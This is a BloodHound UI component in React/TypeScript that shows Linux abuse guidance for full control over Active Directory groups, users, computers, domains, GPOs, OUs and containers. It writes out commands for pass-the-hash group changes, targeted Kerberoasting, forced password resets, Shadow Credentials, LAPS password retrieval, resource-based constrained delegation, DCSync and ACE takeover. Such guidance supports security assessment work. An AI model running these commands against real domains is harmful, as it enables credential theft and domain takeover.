// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { FC } from 'react';
import { Link, Typography } from '@mui/material';
import { EdgeInfoProps } from '../index';

const LinuxAbuse: FC<EdgeInfoProps & { targetId: string; haslaps: boolean }> = ({
    sourceName,
    sourceType,
    targetName,
    targetType,
    targetId,
    haslaps,
}) => {
    switch (targetType) {
        case 'Group':
            return (
                <>
                    <Typography variant='body2'>
                        Full control of a group allows you to directly modify group membership of the group.
                    </Typography>

                    <Typography variant='body2'>
                        Use samba's net tool to add the user to the target group. The credentials can be supplied in
                        cleartext or prompted interactively if omitted from the command line:
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
                        }
                    </Typography>

                    <Typography variant='body2'>
                        It can also be done with pass-the-hash using{' '}
                        <Link target='_blank' rel='noopener' href='https://github.com/byt3bl33d3r/pth-toolkit'>
                            pth-toolkit's net tool
                        </Link>
                        . If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'
                        }
                    </Typography>

                    <Typography variant='body2'>
                        Finally, verify that the user was successfully added to the group:
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
                        }
                    </Typography>
                </>
            );
        case 'User':
            return (
                <>
                    <Typography variant='body2'>
                        Full control of a user allows you to modify properties of the user to perform a targeted
                        kerberoast attack, and also grants the ability to reset the password of the user without knowing
                        their current one.
                    </Typography>

                    <Typography variant='body1'> Targeted Kerberoast </Typography>

                    <Typography variant='body2'>
                        A targeted kerberoast attack can be performed using{' '}
                        <Link target='_blank' rel='noopener' href='https://github.com/ShutdownRepo/targetedKerberoast'>
                            targetedKerberoast.py
                        </Link>
                        .
                    </Typography>

                    <Typography component={'pre'}>
                        {"targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"}
                    </Typography>

                    <Typography variant='body2'>
                        The tool will automatically attempt a targetedKerberoast attack, either on all users or against
                        a specific one if specified in the command line, and then obtain a crackable hash. The cleanup
                        is done automatically as well.
                    </Typography>

                    <Typography variant='body2'>
                        The recovered hash can be cracked offline using the tool of your choice.
                    </Typography>

                    <Typography variant='body1'> Force Change Password </Typography>

                    <Typography variant='body2'>
                        Use samba's net tool to change the user's password. The credentials can be supplied in cleartext
                        or prompted interactively if omitted from the command line. The new password will be prompted if
                        omitted from the command line.
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
                        }
                    </Typography>

                    <Typography variant='body2'>
                        It can also be done with pass-the-hash using{' '}
                        <Link target='_blank' rel='noopener' href='https://github.com/byt3bl33d3r/pth-toolkit'>
                            pth-toolkit's net tool
                        </Link>
                        . If the LM hash is not known, use 'ffffffffffffffffffffffffffffffff'.
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'
                        }
                    </Typography>
                    <Typography variant='body2'>
                        Now that you know the target user's plain text password, you can either start a new agent as
                        that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions,
                        or perhaps even RDP to a system the target user has access to. For more ideas and information,
                        see the references tab.
                    </Typography>

                    <Typography variant='body1'> Shadow Credentials attack </Typography>

                    <Typography variant='body2'>
                        To abuse this permission, use{' '}
                        <Link target='_blank' rel='noopener' href='https://github.com/ShutdownRepo/pywhisker'>
                            pyWhisker
                        </Link>
                        .
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'
                        }
                    </Typography>

                    <Typography variant='body2'>
                        For other optional parameters, view the pyWhisker documentation.
                    </Typography>
                </>
            );
        case 'Computer':
            if (haslaps) {
                return (
                    <>
                        <Typography variant='body1'> Retrieve LAPS Password </Typography>
                        <Typography variant='body2'>
                            Full control of a computer object is abusable when the computer's local admin account
                            credential is controlled with LAPS. The clear-text password for the local administrator
                            account is stored in an extended attribute on the computer object called ms-Mcs-AdmPwd. With
                            full control of the computer object, you may have the ability to read this attribute, or
                            grant yourself the ability to read the attribute by modifying the computer object's security
                            descriptor.
                        </Typography>
                        <Typography variant='body2'>
                            <Link target='_blank' rel='noopener' href='https://github.com/p0dalirius/pyLAPS'>
                                pyLAPS
                            </Link>{' '}
                            can be used to retrieve LAPS passwords:
                        </Typography>
                        <Typography component={'pre'}>
                            {'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'}
                        </Typography>
                        <Typography variant='body1'> Resource-Based Constrained Delegation </Typography>
                        First, if an attacker does not control an account with an SPN set, a new attacker-controlled
                        computer account can be added with Impacket's addcomputer.py example script:
                        <Typography component={'pre'}>
                            {
                                "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"
                            }
                        </Typography>
                        We now need to configure the target object so that the attacker-controlled computer can delegate
                        to it. Impacket's rbcd.py script can be used for that purpose:
                        <Typography component={'pre'}>
                            {
                                "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"
                            }
                        </Typography>
                        And finally we can get a service ticket for the service name (sname) we want to "pretend" to be
                        "admin" for. Impacket's getST.py example script can be used for that purpose.
                        <Typography component={'pre'}>
                            {
                                "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"
                            }
                        </Typography>
                        This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of
                        the TARGETCOMPUTER.
                        <Typography variant='body1'> Resource-Based Constrained Delegation </Typography>
                        <Typography variant='body2'>
                            First, if an attacker does not control an account with an SPN set, a new attacker-controlled
                            computer account can be added with Impacket's addcomputer.py example script:
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"
                            }
                        </Typography>
                        <Typography variant='body2'>
                            We now need to configure the target object so that the attacker-controlled computer can
                            delegate to it. Impacket's rbcd.py script can be used for that purpose:
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"
                            }
                        </Typography>
                        <Typography variant='body2'>
                            And finally we can get a service ticket for the service name (sname) we want to "pretend" to
                            be "admin" for. Impacket's getST.py example script can be used for that purpose.
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"
                            }
                        </Typography>
                        <Typography variant='body2'>
                            This ticket can then be used with Pass-the-Ticket, and could grant access to the file system
                            of the TARGETCOMPUTER.
                        </Typography>
                        <Typography variant='body1'> Shadow Credentials attack </Typography>
                        <Typography variant='body2'>
                            To abuse this permission, use{' '}
                            <Link target='_blank' rel='noopener' href='https://github.com/ShutdownRepo/pywhisker'>
                                pyWhisker
                            </Link>
                            .
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'
                            }
                        </Typography>
                        <Typography variant='body2'>
                            For other optional parameters, view the pyWhisker documentation.
                        </Typography>
                    </>
                );
            } else {
                return (
                    <>
                        <Typography variant='body1'> Resource-Based Constrained Delegation </Typography>
                        <Typography variant='body2'>
                            First, if an attacker does not control an account with an SPN set, a new attacker-controlled
                            computer account can be added with Impacket's addcomputer.py example script:
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"
                            }
                        </Typography>
                        <Typography variant='body2'>
                            We now need to configure the target object so that the attacker-controlled computer can
                            delegate to it. Impacket's rbcd.py script can be used for that purpose:
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"
                            }
                        </Typography>
                        <Typography variant='body2'>
                            And finally we can get a service ticket for the service name (sname) we want to "pretend" to
                            be "admin" for. Impacket's getST.py example script can be used for that purpose.
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"
                            }
                        </Typography>
                        <Typography variant='body2'>
                            This ticket can then be used with Pass-the-Ticket, and could grant access to the file system
                            of the TARGETCOMPUTER.
                        </Typography>
                        <Typography variant='body1'> Shadow Credentials attack </Typography>
                        <Typography variant='body2'>
                            To abuse this permission, use{' '}
                            <Link target='_blank' rel='noopener' href='https://github.com/ShutdownRepo/pywhisker'>
                                pyWhisker
                            </Link>
                            .
                        </Typography>
                        <Typography component={'pre'}>
                            {
                                'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'
                            }
                        </Typography>
                        <Typography variant='body2'>
                            For other optional parameters, view the pyWhisker documentation.
                        </Typography>
                    </>
                );
            }
        case 'Domain':
            return (
                <>
                    <Typography variant='body1'> DCSync </Typography>

                    <Typography variant='body2'>
                        The AllExtendedRights permission grants {sourceName} both the DS-Replication-Get-Changes and
                        DS-Replication-Get-Changes-All permission, which combined allow a principal to replicate objects
                        from the domain {targetName}.
                    </Typography>

                    <Typography variant='body2'>
                        This can be abused using Impacket's secretsdump.py example script:
                    </Typography>

                    <Typography component={'pre'}>
                        {"secretsdump 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'"}
                    </Typography>

                    <Typography variant='body1'> Retrieve LAPS Passwords </Typography>

                    <Typography variant='body2'>
                        The AllExtendedRights permission also grants {sourceName} enough permissions, to retrieve LAPS
                        passwords domain-wise.
                    </Typography>

                    <Typography variant='body2'>
                        <Link target='_blank' rel='noopener' href='https://github.com/p0dalirius/pyLAPS'>
                            pyLAPS
                        </Link>{' '}
                        can be used for that purpose:
                    </Typography>

                    <Typography component={'pre'}>
                        {'pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"'}
                    </Typography>
                </>
            );
        case 'GPO':
            return (
                <>
                    <Typography variant='body2'>
                        With full control of a GPO, you may make modifications to that GPO which will then apply to the
                        users and computers affected by the GPO. Select the target object you wish to push an evil
                        policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows
                        item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the
                        group policy client to pick up and execute the new evil policy. See the references tab for a
                        more detailed write up on this abuse.
                    </Typography>

                    <Typography variant='body2'>
                        <Link target='_blank' rel='noopener' href='https://github.com/Hackndo/pyGPOAbuse'>
                            pyGPOAbuse.py
                        </Link>{' '}
                        can be used for that purpose.
                    </Typography>
                </>
            );
        case 'OU':
            return (
                <>
                    <Typography variant='body1'>Control of the Organization Unit</Typography>

                    <Typography variant='body2'>
                        With full control of the OU, you may add a new ACE on the OU that will inherit down to the
                        objects under that OU. Below are two options depending on how targeted you choose to be in this
                        step:
                    </Typography>

                    <Typography variant='body1'>Generic Descendent Object Takeover</Typography>
                    <Typography variant='body2'>
                        The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll
                        ACE on the OU that will inherit down to all object types. This can be done using Impacket's
                        dacledit (cf. "grant rights" reference for the link).
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            "dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'OUDistinguishedName' 'domain'/'user':'password'"
                        }
                    </Typography>

                    <Typography variant='body2'>
                        Now, the "JKOHLER" user will have full control of all descendent objects of each type.
                    </Typography>

                    <Typography variant='body1'>Targeted Descendent Object Takeoever</Typography>

                    <Typography variant='body2'>
                        If you want to be more targeted with your approach, it is possible to specify precisely what
                        right you want to apply to precisely which kinds of descendent objects. Refer to the Windows
                        Abuse info for this.
                    </Typography>
                </>
            );
        case 'Container':
            return (
                <>
                    <Typography variant='body1'>Control of the Container</Typography>

                    <Typography variant='body2'>
                        With full control of the container, you may add a new ACE on the container that will inherit
                        down to the objects under that OU. Below are two options depending on how targeted you choose to
                        be in this step:
                    </Typography>

                    <Typography variant='body1'>Generic Descendent Object Takeover</Typography>
                    <Typography variant='body2'>
                        The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll
                        ACE on the OU that will inherit down to all object types. This can be done using Impacket's
                        dacledit (cf. "grant rights" reference for the link).
                    </Typography>

                    <Typography component={'pre'}>
                        {
                            "dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'containerDistinguishedName' 'domain'/'user':'password'"
                        }
                    </Typography>

                    <Typography variant='body2'>
                        Now, the "JKOHLER" user will have full control of all descendent objects of each type.
                    </Typography>

                    <Typography variant='body1'>Targeted Descendent Object Takeoever</Typography>

                    <Typography variant='body2'>
                        If you want to be more targeted with your approach, it is possible to specify precisely what
                        right you want to apply to precisely which kinds of descendent objects. Refer to the Windows
                        Abuse info for this.
                    </Typography>
                </>
            );
    }
    return <></>;
};

export default LinuxAbuse;
